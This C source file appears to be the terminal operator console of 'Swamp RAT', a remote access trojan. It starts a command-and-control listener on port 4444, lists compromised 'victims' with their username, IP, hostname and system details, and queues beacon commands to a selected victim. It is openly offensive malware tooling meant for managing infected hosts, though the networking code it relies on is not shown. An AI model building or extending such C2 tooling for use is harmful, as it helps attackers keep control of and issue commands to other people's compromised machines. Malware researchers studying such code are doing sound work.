/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ncurses.h>
#include <menu.h>
#include <errno.h>
#include <pthread.h>
#include "net.h"

#define ARRAY_SIZE(a)(sizeof(a) / sizeof(a[0]))

MENU *menu;
ITEM **items;
WINDOW *win_menu;
WINDOW *win_main;
int  x_margin = 4;
int  y_margin = 2;
char win_menu_title[] = "V!cT!m5";
char win_main_version[] = "|lillypad|";
char win_main_title[] = "|Swamp RAT|";
char win_main_msg[] = "~~(__`*>";

pthread_mutex_t ncurses_mutex = PTHREAD_MUTEX_INITIALIZER;

char *itoa(int x){
  /*
    :TODO: integer to (char *)
    :x: integer
    :returns: (char *)
  */
  char* buffer = malloc(sizeof(char) * sizeof(int) * 4 + 1);
  if (buffer){
    sprintf(buffer, "%d", x);
  }
  return buffer;
}

bool ncurses_window_cleanup(WINDOW *win){
  /*
    :TODO: clean up window
    :returns: boolean
  */
  delwin(win);
  endwin();
  refresh();
  return true;
}

bool ncurses_window_border(WINDOW *win){
  /*
    :TODO: draw window border
    :returns: boolean
  */
  box(win, 0, 0);
  refresh();
  return true;
}

bool ncurses_window_title(WINDOW *win, char *title){
  /*
    :TODO: draw window title
    :win: pointer to window struct
    :title: title of window
    :returns: boolean
  */
  int x, y;
  getmaxyx(win, y, x);
  mvprintw(0, ((x / 2) - (strlen(title)/2)), title);
  refresh();
  return true;
}

bool ncurses_window_footer(WINDOW *win, char *footer){
  /*
    :TODO: draw window footer
    :win: pointer to window struct
    :footer: footerof window
    :returns: boolean
  */
  int x, y;
  getmaxyx(win, y, x);
  mvprintw(y - 1, ((x / 2) - (strlen(footer) / 2) + 1), footer);
  refresh();
  return true;
}

#ifndef NCURSES_MAIN_WIN_COLOR
#define NCURSES_MAIN_WIN_COLOR 1
#endif

#ifndef NCURSES_MENU_WIN_COLOR
#define NCURSES_MENU_WIN_COLOR 2
#endif

void ncurses_print_menu_title(WINDOW *win,
                     int starty,
                     int startx,
                     int width,
                     char *string){
  int length, x, y;
  float temp;

  if(win == NULL){
    win = stdscr;
  }
  getyx(win, y, x);
  if(startx != 0){
    x = startx;
  }
  if(starty != 0){
    y = starty;
  }
  if(width == 0){
    width = 80;
  }
  length = strlen(string);
  temp = (width - length)/ 2;
  x = startx + (int)temp;
  mvwprintw(win, y, x, "%s", string);
  refresh();
}

bool ncurses_menu_cleanup(MENU *menu){
  /*
    :TODO: cleanup menu
    :menu: (MENU *)
    :returns: boolean
  */
  unpost_menu(menu);
  free_menu(menu);
  return true;
}

bool ncurses_item_cleanup(ITEM **items, int n_items){
  for(int i = 0; i < n_items; ++i){
    
    free_item(items[i]);
  }
  return true;
}

char *ncurses_victim_desc_0(char *s0, char *s2){
  char *s1 = "@";
  char *result = malloc(strlen(s0) + strlen(s1) + strlen(s2) + 1);
  strcpy(result, s0);
  strcat(result, s1);
  strcat(result, s2);
  return result;
}

char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3, char *s4, char *s5){
  char *arch = "arch:";
  char *release = "release:";
  char *hostname = "hostname:";
  char *load = "load:";
  char *space = " ";
  char *at = "@";
  char *result = malloc(strlen(s4) +
                        strlen(at) +
                        strlen(s5) +
                        strlen(space) +
                        strlen(arch) +
                        strlen(s0) +
                        strlen(space) +
                        strlen(release) +
                        strlen(s1) +
                        strlen(space) +
                        strlen(hostname) +
                        strlen(s2) +
                        strlen(space) +
                        strlen(load) +
                        strlen(s3) + 1);
  strcpy(result, s4);
  strcat(result, at);
  strcat(result, s5);
  strcat(result, space);
  strcat(result, arch);
  strcat(result, s0);
  strcat(result, space);
  strcat(result, release);
  strcat(result, s1);
  strcat(result, space);
  strcat(result, hostname);
  strcat(result, s2);
  strcat(result, space);
  strcat(result, load);
  strcat(result, s3);
  return result;
}

bool ncurses_item_victims(ITEM **items, net_client_beacon_t **p_victims){
  for(int i = 0; i < NET_MAX_CLIENTS; ++i){
    if (items[i] != NULL){
      items[i] = NULL;
      free_item(items[i]);
    }
    int j = 0;
    for(int i = 0; i < NET_MAX_CLIENTS; ++i){
      if (p_victims[i] != NULL){
        items[j] = new_item(p_victims[i]->sysinfo.uuid,
                            ncurses_victim_desc_1(p_victims[i]->sysinfo.arch,
                                                  p_victims[i]->sysinfo.release,
                                                  p_victims[i]->sysinfo.hostname,
                                                  itoa(p_victims[i]->sysinfo.cpu_usage),
                                                  p_victims[i]->sysinfo.username,
                                                  p_victims[i]->sysinfo.ip));
        j++;
      }
    }
  }
  return true;
}

#ifndef NCURSES_WMAIN
#define NCURSES_WMAIN_INIT   0
#define NCURSES_WMAIN_UPDATE 1
#define NCURSES_WMAIN
#endif

bool ncurses_wmain(int action, net_client_beacon_t **p_victims, net_server_beacon_t **p_commands){
  int y, x;
  if (action == NCURSES_WMAIN_INIT){
    if(putenv("TERM=linux") != 0){
      fprintf(stderr, "[x] %s\n", strerror(errno));
      return false;
    }
    if ((win_main = initscr()) == NULL){
      fprintf(stderr, "[x] %s\n", strerror(errno));
      return false;
    }
    if (start_color() == ERR || !has_colors() || !can_change_color()){
      ncurses_window_cleanup(win_main);
      fprintf(stderr, "[x] %s\n", strerror(errno));
      return false;
    }
    if (net_server_async(4444, p_victims, p_commands) == false){
      fprintf(stderr, "[x] failed to start cnc server!\n");
      return false;
    }
    getmaxyx(win_main, y, x);
    win_menu = newwin((y - (y_margin * 2)),
                      (x - (x_margin * 2)),
                      2,
                      4);
    curs_set(0);
    init_pair(NCURSES_MAIN_WIN_COLOR, COLOR_GREEN, COLOR_BLACK);
    init_pair(NCURSES_MENU_WIN_COLOR, COLOR_RED, COLOR_BLACK);
    wbkgd(win_main, COLOR_PAIR(NCURSES_MAIN_WIN_COLOR));
    wbkgd(win_menu, COLOR_PAIR(NCURSES_MENU_WIN_COLOR));
    cbreak();
    noecho();
    keypad(win_main, true);
    keypad(win_menu, true);
    items = malloc(NET_MAX_CLIENTS * sizeof(ITEM));
  }
  if (action == NCURSES_WMAIN_UPDATE){
    
    getmaxyx(win_main, y, x);
    wclear(win_main);
    wclear(win_menu);
    mvprintw(1, 1, "victims: %d\n", NET_VICTIMS_TOTAL);
    mvprintw(y - 2, 1, "queued commands: %d\n", NET_COMMANDS_TOTAL);
    mvprintw(y - 2, (x - 53), "HELP: refresh:[R|r] select:[ENTER] navigate:[arrows]");
    mvprintw(1, x - strlen(win_main_msg) -1, win_main_msg);
    box(win_main, 0, 0);
    ncurses_window_title(win_main, win_main_title);
    ncurses_window_footer(win_main, win_main_version);
    pthread_mutex_lock(&ncurses_mutex);
    ncurses_item_victims(items, p_victims);
    pthread_mutex_unlock(&ncurses_mutex);
    menu = new_menu(items);
    wmove(win_menu, 4, 2);
    wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
    set_menu_win(menu, win_menu);
    set_menu_sub(menu, derwin(win_menu, (y - (y_margin * 2) - 4), (x - (x_margin *2) - 4), 3, 1));
    set_menu_format(menu, (y - (y_margin * 2) - 4), 1);
    set_menu_mark(menu, " -> ");
    box(win_menu, 0, 0);
    ncurses_print_menu_title(win_menu, 1, 0, (x - (x_margin * 2)), win_menu_title);
    mvwaddch(win_menu, y_margin, 0, ACS_LTEE);
    mvwhline(win_menu, y_margin, 1, ACS_HLINE, ((x - (x_margin * 2)) - 2));
    mvwaddch(win_menu, y_margin, (x - (x_margin * 2)) - 1, ACS_RTEE);
    post_menu(menu);
    refresh();
    wrefresh(win_main);
    wrefresh(win_menu);
    
  } 
  return false;
}

#ifndef NCURSES_PTHREAD_REFRESH
typedef struct{
  net_client_beacon_t **p_victims;
  net_server_beacon_t **p_commands;
} ncurses_pthread_refresh_args_t;
#define NCURSES_PTHREAD_REFRESH
#endif

void *ncurses_pthread_refresh(void *args){
  ncurses_pthread_refresh_args_t *p_args = args;
  int n_victims = NET_VICTIMS_TOTAL;
  int n_commands = NET_COMMANDS_TOTAL;
  while (true){
    if (n_victims != NET_VICTIMS_TOTAL || n_commands != NET_COMMANDS_TOTAL){
      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_args->p_victims, p_args->p_commands);
      n_victims = NET_VICTIMS_TOTAL;
      n_commands = NET_COMMANDS_TOTAL;
      sleep(1);
    }
  }
  pthread_exit(NULL);
}

bool ncurses_main(){
  /*
    :TODO: main ncurses interface
    :returns: boolean
  */

  int key;

  net_client_beacon_t **p_victims = net_create_victims();
  net_server_beacon_t **p_commands = net_create_commands();
  
  ncurses_wmain(NCURSES_WMAIN_INIT, p_victims, p_commands);

  ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);

  pthread_t t_ncurses_pthread_refresh;
  ncurses_pthread_refresh_args_t *p_ncurses_pthread_refresh_args = malloc(sizeof(ncurses_pthread_refresh_args_t));
  p_ncurses_pthread_refresh_args->p_victims = p_victims;
  p_ncurses_pthread_refresh_args->p_commands = p_commands;
  pthread_create(&t_ncurses_pthread_refresh, NULL, ncurses_pthread_refresh, p_ncurses_pthread_refresh_args);
  
  while(true){
    key = getch();
    if (key == KEY_RESIZE){
      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);
    }
    if (key == 'r' || key == 'R'){
      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);
    }
    if (key == KEY_DOWN){
      menu_driver(menu, REQ_DOWN_ITEM);
      wrefresh(win_menu);
    }
    if (key == KEY_NPAGE){
      menu_driver(menu, REQ_SCR_DPAGE);
      wrefresh(win_menu);
    }
    if (key == KEY_UP){
      menu_driver(menu, REQ_UP_ITEM);
      wrefresh(win_menu);
    }
    if (key == KEY_PPAGE){
      menu_driver(menu, REQ_SCR_UPAGE);
      wrefresh(win_menu);
    }
    if (key == 10 || key == KEY_ENTER){
      ITEM *item;
      char uuid[SYS_UUID_SIZE];
      item = current_item(menu);
      strncpy(uuid, item_name(item), SYS_UUID_SIZE);
      net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_server_beacon_t));
      p_net_server_beacon->command = NET_SERVER_CMD_BEACON;
      p_net_server_beacon->status = true;
      strcpy(p_net_server_beacon->uuid, uuid);
      strcpy(p_net_server_beacon->data, "TESTTESTTESTTEST");
      net_update_commands(p_net_server_beacon, p_commands);
    }
  }
  ncurses_menu_cleanup(menu);
  ncurses_item_cleanup(items, NET_VICTIMS_TOTAL);
  endwin();
  return true;
}


